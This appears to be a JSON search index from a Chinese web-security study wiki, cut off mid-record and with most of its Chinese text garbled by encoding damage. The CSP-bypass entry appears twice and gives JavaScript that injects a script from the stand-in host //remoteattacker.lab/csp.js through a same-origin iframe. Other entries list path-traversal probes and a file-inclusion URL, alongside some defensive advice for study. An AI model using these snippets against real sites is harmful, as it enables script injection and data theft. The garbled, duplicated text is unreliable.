0.03);self/fontï¼šåªå…è®¸åŠ è½½åŒæºèµ„æºã€‚ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);unsafe-inline/fontï¼šå…è®¸å†…è”è„šæœ¬ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);scriptalert(1)/script/fontï¼‰ã€‚ âŒ ä¸å…è®¸ä»å¤–éƒ¨åŸŸååŠ è½½è„šæœ¬ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);//remoteattacker.lab/csp.js/fontï¼‰ã€‚ âœ… æ”»å‡»æ€è·¯ï¼šåˆ©ç”¨ iframe çš„â€œåŒæºâ€ç‰¹æ€§è™½ç„¶ä¸»é¡µé¢ä¸èƒ½åŠ è½½å¤–éƒ¨è„šæœ¬ï¼Œä½†ï¼š iframe åŠ è½½çš„æ˜¯åŒæºé¡µé¢ï¼ˆå¦‚ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);/robots.txt/fontï¼Œåªè¦æ˜¯åŒæºçš„å°±è¡Œï¼‰ã€‚ iframe çš„å†…å®¹å±äºåŒæºï¼Œå› æ­¤å¯ä»¥æ“ä½œå…¶ DOMã€‚ å‘ iframe ä¸­æ³¨å…¥ **font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);script/font**ï¼Œç›¸å½“äºåœ¨åŒæºç¯å¢ƒä¸­åŠ è½½å¤–éƒ¨è„šæœ¬ï¼Œä»è€Œç»•è¿‡ CSP é™åˆ¶ã€‚ âœ… æ”»å‡»ä»£ç é€æ­¥è§£é‡Šç¬¬ä¸€æ­¥ï¼šåˆ›å»º iframe å¹¶åŠ è½½åŒæºé¡µé¢JavaScript å¤åˆ¶ f = document.createElement(iframe);f.id = pwn;f.src = /robots.txt; // åªè¦æ˜¯åŒæºçš„å°±è¡Œdocument.body.appendChild(f); ç¬¬äºŒæ­¥ï¼šiframe åŠ è½½å®Œæˆåï¼Œå‘å…¶ä¸­æ³¨å…¥å¤–éƒ¨è„šæœ¬JavaScript å¤åˆ¶ f.onload = () = x = document.createElement(script); x.src = //remoteattacker.lab/csp.js; // å¤–éƒ¨æ¶æ„è„šæœ¬ pwn.contentWindow.document.body.appendChild(x); // æ³¨å…¥åˆ° iframe ä¸­; âœ… ç®€åŒ–ç‰ˆä»£ç ï¼ˆä½ æä¾›çš„ç¬¬äºŒæ®µï¼‰JavaScript å¤åˆ¶ script = document.createElement(script);script.src = //remoteattacker.lab/csp.js;window.frames[0].document.head.appendChild(script); è¿™æ®µä»£ç å‡è®¾é¡µé¢ä¸Šå·²ç»æœ‰ä¸€ä¸ª iframeï¼ˆæ¯”å¦‚å‰é¢æ³¨å…¥çš„ï¼‰ã€‚ å®ƒç›´æ¥å‘ iframe çš„ DOM ä¸­æ’å…¥å¤–éƒ¨è„šæœ¬ï¼Œç»•è¿‡ä¸»é¡µé¢ CSPã€‚ âš ï¸ å…³é”®ç‚¹æ€»ç»“è¡¨æ ¼ å¤åˆ¶ é™åˆ¶ ç»•è¿‡æ–¹å¼ ä¸»é¡µé¢ä¸èƒ½åŠ è½½å¤–éƒ¨è„šæœ¬ ä¸ç›´æ¥åŠ è½½ï¼Œè€Œæ˜¯æ³¨å…¥åˆ° åŒæºçš„ iframe ä¸­ iframe ä¹Ÿå— CSP é™åˆ¶ï¼Ÿ âœ… ä½† iframe çš„ DOM å¯ä»¥è¢«ä¸»é¡µé¢æ“ä½œï¼Œåªè¦åŒæº å¤–éƒ¨è„šæœ¬åŠ è½½æˆåŠŸï¼Ÿ âœ… å› ä¸º iframe ä¸­æ’å…¥çš„è„šæœ¬ä¸å—ä¸»é¡µé¢ CSP é™åˆ¶ï¼ˆå®ƒæ˜¯ç‹¬ç«‹æ–‡æ¡£ï¼‰ âœ… é˜²å¾¡å»ºè®® é™åˆ¶ iframe ä½¿ç”¨ï¼š ä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);frame-ancestors none/font é˜²æ­¢è¢«åµŒå¥—ã€‚ æˆ–ä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);sandbox/font å±æ€§é™åˆ¶ iframe æƒé™ã€‚ ç»†åŒ– CSPï¼š ä¸è¦ä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);default-src self/font è¿™ä¹ˆå®½æ¾ã€‚ æ˜ç¡®æŒ‡å®š font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);script-src self/font ç¦æ­¢å¤–éƒ¨è„šæœ¬ã€‚ ç¦æ­¢ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);unsafe-inline/font æˆ–ä½¿ç”¨ font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);nonce/hash/font æœºåˆ¶ã€‚ é˜²æ­¢ iframe è¢«æ»¥ç”¨ï¼š å¯¹é¡µé¢ä¸­åŠ¨æ€åˆ›å»ºçš„ iframe è¿›è¡Œç›‘æ§æˆ–é™åˆ¶ã€‚ è®¾ç½® font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);X-Frame-Options: DENY/font æˆ– font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);SAMEORIGIN/fontã€‚"},{"title":"å¸¸è§å¯†ç &è·¯å¾„","path":"/wiki/WebçŸ¥è¯†ç‚¹/å¸¸è§å¯†ç &è·¯å¾„/index.html","content":"å¯†ç  æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½•"},{"title":"ç»•è¿‡CSPé»˜è®¤æº","path":"/wiki/WebçŸ¥è¯†ç‚¹/xss/ç»•è¿‡CSPé»˜è®¤æº.html","content":"ç»•è¿‡ CSP é»˜è®¤æºğŸ” æ”»å‡»åŸç†è¯¦è§£âœ… CSP è®¾ç½®åˆ†ædefault-src self unsafe-inline; selfï¼šåªå…è®¸åŠ è½½åŒæºèµ„æºã€‚ unsafe-inlineï¼šå…è®¸å†…è”è„šæœ¬ï¼ˆå¦‚ alert(1)ï¼‰ã€‚ âŒ ä¸å…è®¸ä»å¤–éƒ¨åŸŸååŠ è½½è„šæœ¬ï¼ˆå¦‚ //remoteattacker.lab/csp.jsï¼‰ã€‚ âœ… æ”»å‡»æ€è·¯ï¼šåˆ©ç”¨ iframe çš„â€œåŒæºâ€ç‰¹æ€§è™½ç„¶ä¸»é¡µé¢ä¸èƒ½åŠ è½½å¤–éƒ¨è„šæœ¬ï¼Œä½†ï¼š iframe åŠ è½½çš„æ˜¯åŒæºé¡µé¢ï¼ˆå¦‚ /robots.txtï¼Œåªè¦æ˜¯åŒæºçš„å°±è¡Œï¼‰ã€‚ iframe çš„å†…å®¹å±äºåŒæºï¼Œå› æ­¤å¯ä»¥æ“ä½œå…¶ DOMã€‚ å‘ iframe ä¸­æ³¨å…¥ ï¼Œç›¸å½“äºåœ¨åŒæºç¯å¢ƒä¸­åŠ è½½å¤–éƒ¨è„šæœ¬ï¼Œä»è€Œç»•è¿‡ CSP é™åˆ¶ã€‚ âœ… æ”»å‡»ä»£ç é€æ­¥è§£é‡Šç¬¬ä¸€æ­¥ï¼šåˆ›å»º iframe å¹¶åŠ è½½åŒæºé¡µé¢JavaScript å¤åˆ¶ f = document.createElement(iframe);f.id = pwn;f.src = /robots.txt; // åªè¦æ˜¯åŒæºçš„å°±è¡Œdocument.body.appendChild(f); ç¬¬äºŒæ­¥ï¼šiframe åŠ è½½å®Œæˆåï¼Œå‘å…¶ä¸­æ³¨å…¥å¤–éƒ¨è„šæœ¬JavaScript å¤åˆ¶ f.onload = () = x = document.createElement(script); x.src = //remoteattacker.lab/csp.js; // å¤–éƒ¨æ¶æ„è„šæœ¬ pwn.contentWindow.document.body.appendChild(x); // æ³¨å…¥åˆ° iframe ä¸­; âœ… ç®€åŒ–ç‰ˆä»£ç ï¼ˆä½ æä¾›çš„ç¬¬äºŒæ®µï¼‰JavaScript å¤åˆ¶ script = document.createElement(script);script.src = //remoteattacker.lab/csp.js;window.frames[0].document.head.appendChild(script); è¿™æ®µä»£ç å‡è®¾é¡µé¢ä¸Šå·²ç»æœ‰ä¸€ä¸ª iframeï¼ˆæ¯”å¦‚å‰é¢æ³¨å…¥çš„ï¼‰ã€‚ å®ƒç›´æ¥å‘ iframe çš„ DOM ä¸­æ’å…¥å¤–éƒ¨è„šæœ¬ï¼Œç»•è¿‡ä¸»é¡µé¢ CSPã€‚ âš ï¸ å…³é”®ç‚¹æ€»ç»“è¡¨æ ¼ å¤åˆ¶ é™åˆ¶ ç»•è¿‡æ–¹å¼ ä¸»é¡µé¢ä¸èƒ½åŠ è½½å¤–éƒ¨è„šæœ¬ ä¸ç›´æ¥åŠ è½½ï¼Œè€Œæ˜¯æ³¨å…¥åˆ° åŒæºçš„ iframe ä¸­ iframe ä¹Ÿå— CSP é™åˆ¶ï¼Ÿ âœ… ä½† iframe çš„ DOM å¯ä»¥è¢«ä¸»é¡µé¢æ“ä½œï¼Œåªè¦åŒæº å¤–éƒ¨è„šæœ¬åŠ è½½æˆåŠŸï¼Ÿ âœ… å› ä¸º iframe ä¸­æ’å…¥çš„è„šæœ¬ä¸å—ä¸»é¡µé¢ CSP é™åˆ¶ï¼ˆå®ƒæ˜¯ç‹¬ç«‹æ–‡æ¡£ï¼‰ âœ… é˜²å¾¡å»ºè®® é™åˆ¶ iframe ä½¿ç”¨ï¼š ä½¿ç”¨ frame-ancestors none é˜²æ­¢è¢«åµŒå¥—ã€‚ æˆ–ä½¿ç”¨ sandbox å±æ€§é™åˆ¶ iframe æƒé™ã€‚ ç»†åŒ– CSPï¼š ä¸è¦ä½¿ç”¨ default-src self è¿™ä¹ˆå®½æ¾ã€‚ æ˜ç¡®æŒ‡å®š script-src self ç¦æ­¢å¤–éƒ¨è„šæœ¬ã€‚ ç¦æ­¢ unsafe-inline æˆ–ä½¿ç”¨ nonce/hash æœºåˆ¶ã€‚ é˜²æ­¢ iframe è¢«æ»¥ç”¨ï¼š å¯¹é¡µé¢ä¸­åŠ¨æ€åˆ›å»ºçš„ iframe è¿›è¡Œç›‘æ§æˆ–é™åˆ¶ã€‚ è®¾ç½® X-Frame-Options: DENY æˆ– SAMEORIGINã€‚ æ›´æ–°: 2025-10-30 12:09:34åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/mnqgka24pvso2uzf"},{"title":"å·¥å…·æŒ‡å—","path":"/wiki/WebçŸ¥è¯†ç‚¹/å·¥å…·æŒ‡å—/index.html","content":"kaliæ“ä½œ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"æ–‡ä»¶ä¸‹è½½","path":"/wiki/WebçŸ¥è¯†ç‚¹/æ–‡ä»¶ä¸‹è½½/index.html","content":"æ–‡ä»¶ä¸‹è½½ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"æ–‡ä»¶ä¸‹è½½","path":"/wiki/WebçŸ¥è¯†ç‚¹/æ–‡ä»¶ä¸‹è½½/æ–‡ä»¶ä¸‹è½½.html","content":"æ£€æµ‹å‚æ•°å€¼åæ¥ä¸Šæ˜¯å¦ä¸ºæ–‡ä»¶æˆ–æ–‡ä»¶é“¾æ¥read.xxx?filenamedown.xxx?filenamereadfile.xxx?filedownfile.xxx?file.. ..\\ . .ç­‰%00 ? %23 %20 .ç­‰readpathã€filepathã€pathã€inputpathã€urlã€dataã€readfileã€menuã€META-INFã€WEB-INFã€"},{"title":"xxeæ¼æ´","path":"/wiki/WebçŸ¥è¯†ç‚¹/xxeæ¼æ´/xxeæ¼æ´.html","content":"xxeæ¼æ´"},{"title":"xxeæ¼æ´","path":"/wiki/WebçŸ¥è¯†ç‚¹/xxeæ¼æ´/index.html","content":"xxeæ¼æ´ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"kaliæ“ä½œ","path":"/wiki/WebçŸ¥è¯†ç‚¹/å·¥å…·æŒ‡å—/kaliæ“ä½œ.html","content":"kaliæ“ä½œ åˆ‡æ¢rootsudo passwd rootsshè¿æ¥ssh_configPæœ‰å…³çš„sshd_configä¸¤ä¸ªPæœ‰å…³çš„ æ›´æ–°æºsudo vim etcaptsources.listdeb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contribæ›´æ–° apt-get update apt-get upgradeapt-get dist-upgradeapt-get clean å®‰è£…vim"},{"title":"æ–‡ä»¶ä¸Šä¼ ","path":"/wiki/WebçŸ¥è¯†ç‚¹/æ–‡ä»¶ä¸Šä¼ /index.html","content":"æ–‡ä»¶ä¸Šä¼  ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"æ–‡ä»¶ä¸Šä¼ ","path":"/wiki/WebçŸ¥è¯†ç‚¹/æ–‡ä»¶ä¸Šä¼ /æ–‡ä»¶ä¸Šä¼ .html","content":"æ–‡ä»¶ä¸Šä¼  http:ç›®æ ‡ç½‘ç«™include.php?fileuploadmerged.gif æ–‡ä»¶å¤´å¯¹ç…§è¡¨ï¼š ç±»å‹ é­”æ•°ï¼ˆHexï¼‰ ASCII è¡¨ç° GIF 47 49 46 38 GIF89a JPEG FF D8 Ã¿Ã˜ PNG 89 50 4E 47 â€°PNG"},{"title":"æ–‡ä»¶åŒ…å«","path":"/wiki/WebçŸ¥è¯†ç‚¹/æ–‡ä»¶åŒ…å«/index.html","content":"æ–‡ä»¶åŒ…å« ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"è¶Šæƒ","path":"/wiki/WebçŸ¥è¯†ç‚¹/é€»è¾‘è¶Šæƒ/è¶Šæƒ.html","content":"é€»è¾‘è¶Šæƒ æ°´å¹³å‚ç›´ å‚ç›´è¶Šæƒ:æ·»åŠ ç”¨æˆ· å‰ææ¡ä»¶:è·å–çš„æ·»åŠ ç”¨æˆ·çš„æ•°æ®åŒ…æ€ä¹ˆæ¥çš„æ•°æ®åŒ…: 1.æ™®é€šç”¨æˆ·å‰ç«¯æœ‰æ“ä½œç•Œé¢å¯ä»¥æŠ“å–æ•°æ®åŒ… 2.é€šè¿‡ç½‘ç«™æºç æœ¬åœ°æ­å»ºè‡ªå·±å»æ¨¡æ‹ŸæŠ“å– 3.ç›²çŒœ é€»è¾‘æ¼æ´ç®€ä»‹é€»è¾‘æ¼æ´å°±æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨ä¸šåŠ¡åŠŸèƒ½ä¸Šçš„è®¾è®¡ç¼ºé™·ï¼Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–ç ´åä¸šåŠ¡çš„å®Œæ•´æ€§ã€‚ä¸€èˆ¬å‡ºç°åœ¨å¯†ç ä¿®æ”¹ã€è¶Šæƒè®¿é—®ã€å¯†ç æ‰¾å›ã€äº¤æ˜“æ”¯ä»˜é‡‘é¢ç­‰åŠŸèƒ½å¤„ã€‚ é€»è¾‘æ¼æ´çš„ç ´åæ–¹å¼å¹¶éæ˜¯å‘ç¨‹åºæ·»åŠ ç ´åå†…å®¹ï¼Œè€Œæ˜¯åˆ©ç”¨é€»è¾‘å¤„ç†ä¸ä¸¥å¯†æˆ–ä»£ç é—®é¢˜æˆ–å›ºæœ‰ä¸è¶³ã€‚æ“ä½œä¸Šå¹¶ä¸å½±å“ç¨‹åºè¿è¡Œï¼Œåœ¨é€»è¾‘ä¸Šæ˜¯é¡ºåˆ©æ‰§è¡Œçš„ã€‚ è¿™ç§æ¼æ´ä¸€èˆ¬çš„é˜²æŠ¤æ‰‹æ®µæˆ–è®¾å¤‡æ— æ³•é˜»æ­¢ï¼Œå› ä¸ºèµ°çš„éƒ½æ˜¯åˆæ³•æµé‡ã€‚ä¹Ÿæ²¡æœ‰é˜²æŠ¤æ ‡å‡†ã€‚ é€»è¾‘æ¼æ´åˆ†ç±»è¶Šæƒæ¼æ´ å¯†ç ä¿®æ”¹ å¯†ç æ‰¾å› éªŒè¯ç ****æ¼æ´ æ”¯ä»˜æ¼æ´ çŸ­ä¿¡****è½°ç‚¸ æŠ•ç¥¨ç§¯åˆ†æŠ½å¥– é€»è¾‘æ¼æ´é‡è¦æ€§å¸¸è§çš„OWASPæ¼æ´ï¼Œé€šè¿‡æ¼æ´æ‰«æå·¥å…·ï¼Œå¤§å¤šæ”¯æŒè‡ªåŠ¨åŒ–æˆ–è€…åŠè‡ªåŠ¨åŒ–æ‰«æå‡ºæ¥ï¼›å¹¶ä¸”ä¼ ç»Ÿçš„å®‰å…¨é˜²å¾¡è®¾å¤‡å’Œæªæ–½æ”¶æ•ˆç”šå¾®ï¼› ä½†é€»è¾‘æ¼æ´å±äºå’Œç³»ç»Ÿè‡ªèº«åŠŸèƒ½å’Œé€»è¾‘æœ‰å…³ç³»çš„æ¼æ´ï¼Œæ¯ä¸€å®¶çš„æ¼æ´å‡ºç°å¯èƒ½å­˜åœ¨ä¸€å®šçš„ç‹¬ç‰¹æ€§ï¼Œå¾ˆéš¾å¤åˆ¶æˆ–è€…é€šè¿‡è§„åˆ™é€šè¿‡è„šæœ¬æ‰«æï¼Œå› æ­¤é€»è¾‘æ¼æ´å¤§å¤šéœ€è¦é…åˆä»£ç å®¡è®¡å’Œæ‰‹åŠ¨æµ‹è¯•æ‰å¯å‘ç°ç›¸å…³æ¼æ´ï¼Œä¹Ÿæ˜¯å·¥å…·æ— æ³•å®Œå…¨æ›¿ä»£äººæ‰€ä½œçš„ä¸€ç±»æ¼æ´ï¼› è¶Šæƒæ¼æ´æ¦‚å¿µè¶Šæƒè®¿é—®ï¼ˆBroken Access Controlï¼Œç®€ç§°BACï¼‰æ˜¯Webåº”ç”¨ç¨‹åºä¸­ä¸€ç§å¸¸è§çš„æ¼æ´ï¼Œç”±äºå…¶å­˜åœ¨èŒƒå›´å¹¿ã€å±å®³å¤§ï¼Œè¢«OWASPåˆ—ä¸ºWebåº”ç”¨åå¤§å®‰å…¨éšæ‚£çš„ç¬¬äºŒåã€‚ è¯¥æ¼æ´æ˜¯æŒ‡åº”ç”¨åœ¨æ£€æŸ¥æˆæƒæ—¶å­˜åœ¨çº°æ¼ï¼Œä½¿å¾—æ”»å‡»è€…åœ¨è·å¾—ä½æƒé™ç”¨æˆ·è´¦æˆ·åï¼Œåˆ©ç”¨ä¸€äº›æ–¹å¼ç»•è¿‡æƒé™æ£€æŸ¥ï¼Œè®¿é—®æˆ–è€…æ“ä½œå…¶ä»–ç”¨æˆ·æˆ–è€…æ›´é«˜æƒé™ã€‚è¶Šæƒæ¼æ´çš„æˆå› ä¸»è¦æ˜¯å› ä¸ºå¼€å‘äººå‘˜åœ¨å¯¹æ•°æ®è¿›è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥è¯¢æ—¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚çš„æ•°æ®è¿‡åˆ†ç›¸ä¿¡è€Œé—æ¼äº†æƒé™çš„åˆ¤å®šï¼Œä¸€æ—¦æƒé™éªŒè¯ä¸å……åˆ†ï¼Œå°±æ˜“è‡´è¶Šæƒæ¼æ´ã€‚ å…¶ä¸­è¶Šæƒè®¿é—®åˆ†ä¸ºï¼š æ°´å¹³è¶Šæƒ å‚ç›´è¶Šæƒ åˆ†ç±»æ°´å¹³è¶Šæƒï¼šç›¸åŒçº§åˆ«ï¼ˆæƒé™ï¼‰çš„ç”¨æˆ·æˆ–è€…åŒä¸€è§’è‰²ä¸­ä¸åŒçš„ç”¨æˆ·ä¹‹é—´ï¼Œå¯ä»¥è¶Šæƒè®¿é—®ã€ä¿®æ”¹æˆ–è€…åˆ é™¤å…¶ä»–ç”¨æˆ·ä¿¡æ¯çš„éæ³•æ“ä½œã€‚å¦‚æœå‡ºç°æ­¤æ¼æ´ï¼Œå¯èƒ½ä¼šé€ æˆå¤§æ‰¹é‡æ•°æ®çš„ æ³„éœ²ï¼Œä¸¥é‡çš„ç”šè‡³ä¼šé€ æˆç”¨æˆ·ä¿¡æ¯è¢«æ¶æ„ç¯¡æ”¹ã€‚ **æ°´å¹³è¶Šæƒï¼š**æŒ‡æ”»å‡»è€…å°è¯•è®¿é—®ä¸ä»–æ‹¥æœ‰ç›¸åŒæƒé™çš„ç”¨æˆ·èµ„æºã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·Aå’Œç”¨æˆ·Bå±äºåŒä¸€è§’è‰²ï¼Œæ‹¥æœ‰ç›¸åŒçš„æƒé™ç­‰çº§ï¼Œä»–ä»¬èƒ½è·å–è‡ªå·±çš„ç§æœ‰æ•°æ®ï¼ˆæ•°æ®Aå’Œæ•°æ®Bï¼‰ï¼Œä½†å¦‚æœç³»ç»ŸåªéªŒè¯äº†èƒ½è®¿é—®æ•°æ®çš„è§’è‰²ï¼Œè€Œæ²¡æœ‰å¯¹æ•°æ®åšç»†åˆ†æˆ–è€…æ ¡éªŒï¼Œå¯¼è‡´ç”¨æˆ·Aèƒ½è®¿é—®åˆ°ç”¨æˆ·Bçš„æ•°æ®ï¼ˆæ•°æ®Bï¼‰ï¼Œé‚£ä¹ˆç”¨æˆ·Aè®¿é—®æ•°æ®Bçš„è¿™ç§è¡Œä¸ºå°±å«åšæ°´å¹³è¶Šæƒè®¿é—® å‚ç›´è¶Šæƒ ï¼šå°±æ˜¯ä¸åŒçº§åˆ«ä¹‹é—´çš„ç”¨æˆ·æˆ–ä¸åŒè§’è‰²ä¹‹é—´ç”¨æˆ·çš„è¶Šæƒï¼Œæ¯”å¦‚æ™®é€šç”¨æˆ·å¯ä»¥æ‰§è¡Œç®¡ç†å‘˜æ‰èƒ½æ‰§è¡Œçš„åŠŸèƒ½ã€‚ å‚ç›´è¶Šæƒï¼šç”±äºåå°åº”ç”¨æ²¡æœ‰åšæƒé™æ§åˆ¶ï¼Œæˆ–ä»…ä»…åœ¨èœå•ã€æŒ‰é’®ä¸Šåšäº†æƒé™æ§åˆ¶ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·åªè¦çŒœæµ‹å…¶ä»–ç®¡ç†é¡µé¢çš„URLæˆ–è€…æ•æ„Ÿçš„å‚æ•°ä¿¡æ¯ï¼Œå°±å¯ä»¥è®¿é—®æˆ–æ§åˆ¶å…¶ä»–è§’è‰²æ‹¥æœ‰çš„æ•°æ®æˆ–é¡µé¢ï¼Œè¾¾åˆ°æƒé™æå‡çš„ç›®çš„ã€‚ äº§ç”ŸåŸå› æ°´å¹³è¶Šæƒå’Œå‚ç›´è¶Šæƒçš„å®šä¹‰ä¸ä¸€æ ·ï¼Œä½†æ¼æ´åŸç†æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯è´¦æˆ·ä½“ç³»ä¸Šåœ¨åˆ¤æ–­æƒé™æ—¶ä¸ä¸¥æ ¼å¯¼è‡´å­˜åœ¨ç»•è¿‡æ¼æ´ï¼Œè¿™ä¸€ç±»çš„ç»•è¿‡é€šå¸¸å‘ç”Ÿåœ¨cookieéªŒè¯ä¸ä¸¥ã€ç®€å•åˆ¤æ–­ç”¨æˆ·æäº¤çš„å‚æ•°ï¼Œå½’æ ¹ç»“åº•ï¼Œéƒ½æ˜¯å› ä¸ºè¿™äº›å‚æ•°æ˜¯åœ¨å®¢æˆ·ç«¯æäº¤ï¼ŒæœåŠ¡ç«¯æœªä¸¥æ ¼æ ¡éªŒã€‚ 1.é€šè¿‡éšè—URL å®ç°æ§åˆ¶è®¿é—®æœ‰äº›ç¨‹åºçš„ç®¡ç†å‘˜çš„ç®¡ç†é¡µé¢åªæœ‰ç®¡ç†å‘˜æ‰æ˜¾ç¤ºï¼Œæ™®é€šç”¨æˆ·çœ‹ä¸åˆ°ï¼Œåˆ©ç”¨ URL å®ç°è®¿é—®æ§åˆ¶ï¼Œä½†URL æ³„éœ²æˆ–è¢«æ¶æ„æ”»å‡»è€…çŒœåˆ°åï¼Œè¿™ä¼šå¯¼è‡´è¶Šæƒæ”»å‡»ã€‚ 2.ç›´æ¥å¯¹è±¡å¼•ç”¨ è¿™ç§é€šè¿‡ä¿®æ”¹ä¸€ä¸‹å‚æ•°å°±å¯ä»¥äº§ç”Ÿæ°´å¹³è¶Šæƒï¼Œä¾‹å¦‚æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯é¡µé¢ URL ååŠ ä¸Šè‡ªå·±çš„ id ä¾¿å¯æŸ¥çœ‹ï¼Œå½“ä¿®æ”¹ä¸ºä»–äººçš„ ID å·æ—¶ä¼šè¿”å›ä»–äººçš„ä¿¡æ¯ï¼Œä¾¿äº§ç”Ÿäº†æ°´å¹³è¶Šæƒã€‚ 3.å¤šé˜¶æ®µåŠŸèƒ½ å¤šé˜¶æ®µåŠŸèƒ½æ˜¯ä¸€ä¸ªåŠŸèƒ½æœ‰å¤šä¸ªé˜¶æ®µçš„å®ç°ã€‚ä¾‹å¦‚ä¿®æ”¹å¯†ç ï¼Œå¯èƒ½ç¬¬ä¸€æ­¥æ˜¯éªŒè¯ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œå·ç éªŒè¯ç ç±»çš„ã€‚ å½“éªŒè¯æˆåŠŸåï¼Œè·³åˆ°ç¬¬äºŒæ­¥ï¼Œè¾“å…¥æ–°å¯†ç ï¼Œå¾ˆå¤šç¨‹åºä¼šåœ¨è¿™ä¸€æ­¥ä¸å†éªŒè¯ç”¨æˆ·èº«ä»½ï¼Œå¯¼è‡´æ¶æ„æ”»å‡»è€…æŠ“åŒ…ç›´æ¥ä¿®æ”¹å¯†ç ã€‚ 4.é™æ€æ–‡ä»¶ å¾ˆå¤šç½‘ç«™çš„ä¸‹è½½åŠŸèƒ½ï¼Œä¸€äº›è¢«ä¸‹è½½çš„é™æ€æ–‡ä»¶ï¼Œä¾‹å¦‚ pdfã€wordã€xls ç­‰ï¼Œå¯èƒ½åªæœ‰ä»˜è´¹ç”¨æˆ·æˆ–ä¼šå‘˜å¯ä¸‹è½½ï¼Œä½†å½“è¿™äº›æ–‡ä»¶çš„ URL åœ°å€æ³„éœ²åï¼Œå¯¼è‡´ä»»ä½•äººå¯ä¸‹è½½ï¼Œå¦‚æœçŸ¥é“ URL å‘½åè§„åˆ™ï¼Œåˆ™ä¼šä¾¿åˆ©æœåŠ¡å™¨çš„æ”¶è´¹æ–‡æ¡£è¿›è¡Œæ‰¹é‡ä¸‹è½½ã€‚ 5.å¹³å°é…ç½®é”™è¯¯ ä¸€äº›ç¨‹åºä¼šé€šè¿‡æ§ä»¶æ¥é™åˆ¶ç”¨æˆ·çš„è®¿é—®ï¼Œä¾‹å¦‚åå°åœ°å€ï¼Œæ™®é€šç”¨æˆ·ä¸å±äºç®¡ç†å‘˜ç»„ï¼Œåˆ™ä¸èƒ½è®¿é—®ã€‚ä½†å½“é…ç½®å¹³å°æˆ–é…ç½®æ§ä»¶é”™è¯¯æ—¶ï¼Œå°±ä¼šå‡ºç°è¶Šæƒè®¿é—®ã€‚ ä¿®å¤å»ºè®®1ã€å‰åç«¯åŒæ—¶å¯¹ç”¨æˆ·è¾“å…¥ä¿¡æ¯è¿›è¡Œæ ¡éªŒï¼ŒåŒé‡éªŒè¯æœºåˆ¶ 2ã€ æ‰§è¡Œå…³é”®æ“ä½œå‰å¿…é¡»éªŒè¯ç”¨æˆ·èº«ä»½ï¼ŒéªŒè¯ç”¨æˆ·æ˜¯å¦å…·å¤‡æ“ä½œæ•°æ®çš„æƒé™ 3ã€ç‰¹åˆ«æ•æ„Ÿæ“ä½œå¯ä»¥è®©ç”¨æˆ·å†æ¬¡è¾“å…¥å¯†ç æˆ–å…¶ä»–çš„éªŒè¯ä¿¡æ¯ã€‚ 4ã€å¯ä»¥ä»ç”¨æˆ·çš„åŠ å¯†è®¤è¯ cookie ä¸­è·å–å½“å‰ç”¨æˆ· idï¼Œé˜²æ­¢æ”»å‡»è€…å¯¹å…¶ä¿®æ”¹ã€‚ æˆ–åœ¨ sessionã€cookie ä¸­åŠ å…¥ä¸å¯é¢„æµ‹ã€ä¸å¯çŒœè§£çš„ user ä¿¡æ¯ã€‚ 5ã€ç›´æ¥å¯¹è±¡å¼•ç”¨çš„åŠ å¯†èµ„æºIDï¼Œé˜²æ­¢æ”»å‡»è€…æšä¸¾IDï¼Œæ•æ„Ÿæ•°æ®ç‰¹æ®ŠåŒ–å¤„ç† 6ã€æ°¸è¿œä¸è¦ç›¸ä¿¡æ¥è‡ªç”¨æˆ·çš„è¾“å…¥ï¼Œå¯¹äºå¯æ§å‚æ•°è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥ä¸è¿‡æ»¤ å¯†ç é‡ç½®æ¼æ´æ¦‚å¿µä»€ä¹ˆæ˜¯å¯†ç é‡ç½®ï¼Ÿ é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¿®æ”¹æ‰åŸæ¥çš„å¯†ç ï¼›å¯†ç é‡ç½®çš„é€”å¾„æœ‰å“ªäº›ï¼Ÿ 1ã€ä¸€ä¸ªç½‘ç«™ï¼Œä¸€èˆ¬æˆ‘ä»¬å¯ä»¥ç™»å½•è¿›å…¥ä¸ªäººä¸­å¿ƒï¼Œç›´æ¥ä¿®æ”¹å¯†ç ï¼› 2ã€å½“æˆ‘ä»¬å¿˜è®°å¯†ç 